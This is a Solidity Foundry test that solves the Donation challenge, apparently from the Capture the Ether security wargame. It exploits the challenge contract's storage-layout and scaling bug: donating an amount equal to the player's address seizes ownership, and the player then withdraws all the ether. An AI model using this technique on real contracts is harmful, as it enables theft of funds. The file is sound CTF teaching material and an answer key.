// SPDX-License-Identifier: MIT

pragma solidity ^0.7.0;
pragma abicoder v2;

import {Test} from "forge-std/Test.sol";

interface IDonationChallenge {
    function isComplete() external view returns (bool);

    function donate(uint256 etherAmount) external payable;

    function withdraw() external;
}

contract TestDonationChallenge is Test {
    IDonationChallenge challenge;

    address deployer = makeAddr("deployer");
    address player = makeAddr("player");

    function setUp() external {
        vm.deal(deployer, 1 ether);
        vm.deal(player, 1 ether);

        vm.prank(deployer);

        address challengeAddress = deployCode(
            "DonationChallenge.sol:DonationChallenge",
            1 ether
        );
        challenge = IDonationChallenge(challengeAddress);
    }

    function test_Solution() external {
        vm.startPrank(player);
        uint256 amount = uint256(player);

        challenge.donate{value: amount / 10 ** 36}(amount);
        challenge.withdraw();
        vm.stopPrank();

        assert(challenge.isComplete());
    }
}
